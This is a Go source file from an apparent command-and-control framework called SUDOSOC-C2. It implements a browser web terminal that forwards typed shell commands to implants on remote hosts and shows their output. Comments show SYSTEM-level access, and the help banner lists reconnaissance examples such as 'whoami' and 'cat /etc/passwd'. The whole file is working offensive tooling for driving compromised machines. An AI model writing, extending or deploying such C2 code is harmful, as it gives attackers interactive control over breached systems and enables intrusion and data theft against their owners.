package web

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/commonpb"
	"github.com/sudosoc/SUDOSOC-C2/protobuf/sudosocpb"
	"github.com/sudosoc/SUDOSOC-C2/server/core"
	"github.com/sudosoc/SUDOSOC-C2/server/rpc"
)

// termMsg is the JSON envelope for the terminal WebSocket protocol.
//
//	Browser → Server: { "type": "input",  "data": "whoami\n" }
//	Server  → Browser: { "type": "output", "data": "NT AUTHORITY\\SYSTEM\r\n" }
//	Server  → Browser: { "type": "prompt", "data": "[phantom:HOST] > " }
//	Server  → Browser: { "type": "error",  "data": "<error message>" }
type termMsg struct {
	Type string `json:"type"`
	Data string `json:"data"`
}

// webRPC is a package-level RPC server used exclusively by the Web UI terminal.
// It is initialised lazily when the first terminal session connects.
var webRPC = &rpc.Server{}

// handleWSTerminal upgrades an HTTP connection to WebSocket and bridges
// xterm.js I/O to the chosen implant session via the existing RPC layer.
//
// Route: GET /ws/terminal/{sessionID}
func handleWSTerminal(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	sessionID := vars["sessionID"]

	session := core.Sessions.Get(sessionID)
	if session == nil {
		jsonError(w, "session not found", http.StatusNotFound)
		return
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	// ── Welcome banner ────────────────────────────────────────────────────
	sendTerm(conn, "output", fmt.Sprintf(
		"\r\n\033[1;32m[+] Connected → %s (%s/%s) via %s\033[0m\r\n",
		session.Name, session.OS, session.Arch, session.Connection.Transport,
	))
	sendTerm(conn, "output", fmt.Sprintf(
		"\033[1;33m[*] %s | %s | PID %d\033[0m\r\n\r\n",
		session.Hostname, session.Username, session.PID,
	))
	sendPrompt(conn, session.Name, session.Hostname)

	ctx := r.Context()

	// ── Read loop ─────────────────────────────────────────────────────────
	for {
		_, raw, err := conn.ReadMessage()
		if err != nil {
			return
		}

		var msg termMsg
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}
		if msg.Type != "input" {
			continue
		}

		input := strings.TrimSpace(msg.Data)
		if input == "" {
			sendPrompt(conn, session.Name, session.Hostname)
			continue
		}

		// ── Built-in commands ─────────────────────────────────────────────
		switch strings.ToLower(input) {
		case "exit", "quit", "disconnect":
			sendTerm(conn, "output", "\r\n\033[1;31m[!] Disconnected.\033[0m\r\n")
			return

		case "help", "?":
			sendTerm(conn, "output", termHelpText())
			sendPrompt(conn, session.Name, session.Hostname)
			continue

		case "info":
			sendTerm(conn, "output", fmt.Sprintf(
				"\r\nID        : %s\r\nName      : %s\r\nHostname  : %s\r\nUser      : %s\r\nOS        : %s/%s\r\nPID       : %d\r\nC2        : %s\r\nTransport : %s\r\n\r\n",
				session.ID, session.Name, session.Hostname, session.Username,
				session.OS, session.Arch, session.PID,
				session.ActiveC2, session.Connection.Transport,
			))
			sendPrompt(conn, session.Name, session.Hostname)
			continue
		}

		// ── Forward to implant via Execute ────────────────────────────────
		out, execErr := executeOnSession(ctx, session, input)
		if execErr != nil {
			sendTerm(conn, "error", fmt.Sprintf(
				"\r\n\033[1;31m[!] Error: %v\033[0m\r\n", execErr,
			))
		} else {
			sendTerm(conn, "output", "\r\n"+normalizeOutput(out)+"\r\n")
		}
		sendPrompt(conn, session.Name, session.Hostname)
	}
}

// executeOnSession sends a shell execute request to the implant and returns
// combined stdout+stderr as a string.
func executeOnSession(_ context.Context, session *core.Session, cmd string) (string, error) {
	if strings.TrimSpace(cmd) == "" {
		return "", nil
	}

	var req *sudosocpb.ExecuteReq

	// Android implants run in a restricted process without PATH configured.
	// Wrap every command in /system/bin/sh -c so binaries are found via the
	// shell (same fix as the REST API execute handler).
	if strings.Contains(strings.ToLower(session.OS), "android") {
		req = &sudosocpb.ExecuteReq{
			Path:   "/system/bin/sh",
			Args:   []string{"-c", cmd},
			Output: true,
			Request: &commonpb.Request{SessionID: session.ID},
		}
	} else {
		args := strings.Fields(cmd)
		if len(args) == 0 {
			return "", nil
		}
		req = &sudosocpb.ExecuteReq{
			Path:   args[0],
			Args:   args[1:],
			Output: true,
			Request: &commonpb.Request{SessionID: session.ID},
		}
	}

	resp := &sudosocpb.Execute{Response: &commonpb.Response{}}
	if err := webRPC.GenericHandler(req, resp); err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if stdout := resp.GetStdout(); len(stdout) > 0 {
		buf.Write(stdout)
	}
	if stderr := resp.GetStderr(); len(stderr) > 0 {
		if buf.Len() > 0 {
			buf.WriteByte('\n')
		}
		buf.Write(stderr)
	}
	return buf.String(), nil
}

// normalizeOutput converts bare \n to \r\n for xterm.js display.
func normalizeOutput(s string) string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	return strings.ReplaceAll(s, "\n", "\r\n")
}

// sendTerm writes a typed terminal message to the WebSocket connection.
func sendTerm(conn *websocket.Conn, msgType, data string) {
	raw, _ := json.Marshal(termMsg{Type: msgType, Data: data})
	_ = conn.WriteMessage(websocket.TextMessage, raw)
}

// sendPrompt emits the styled PS1 prompt to the xterm.js client.
func sendPrompt(conn *websocket.Conn, name, host string) {
	p := fmt.Sprintf("\033[1;36m[phantom:%s]\033[0m@\033[1;35m[%s]\033[0m \033[1;37m>\033[0m ", name, host)
	sendTerm(conn, "prompt", p)
}

// termHelpText returns the help banner shown on `help` / `?`.
func termHelpText() string {
	return "\r\n" +
		"╔══════════════════════════════════════════════════════════╗\r\n" +
		"║          SUDOSOC-C2 — Web Terminal Commands               ║\r\n" +
		"╠══════════════════════════════════════════════════════════╣\r\n" +
		"║  info               Show current session details          ║\r\n" +
		"║  help / ?           Show this help                        ║\r\n" +
		"║  exit / quit        Disconnect                            ║\r\n" +
		"║                                                           ║\r\n" +
		"║  <any command>      Execute on the implant via shell      ║\r\n" +
		"║                                                           ║\r\n" +
		"║  Examples:                                                ║\r\n" +
		"║    whoami                                                 ║\r\n" +
		"║    ipconfig /all                                          ║\r\n" +
		"║    cat /etc/passwd                                        ║\r\n" +
		"╚══════════════════════════════════════════════════════════╝\r\n\r\n"
}
